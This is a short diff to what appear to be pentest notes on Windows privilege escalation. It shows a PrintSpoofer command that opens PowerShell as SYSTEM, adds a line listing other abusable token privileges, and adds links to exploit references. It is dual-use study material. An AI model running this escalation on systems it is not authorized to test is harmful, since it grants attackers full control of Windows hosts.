@@ -335,9 +335,12 @@ PS> .\printspoofer.exe -i -c powershell.exe
 PS> whoami # nt authority\system
 ```
 
-References:
+Other privileges: SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug
+
+Exploit references:
 - https://github.com/itm4n/PrintSpoofer
 - https://jlajara.gitlab.io/Potatoes_Windows_Privesc
+- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
 
 ---
 
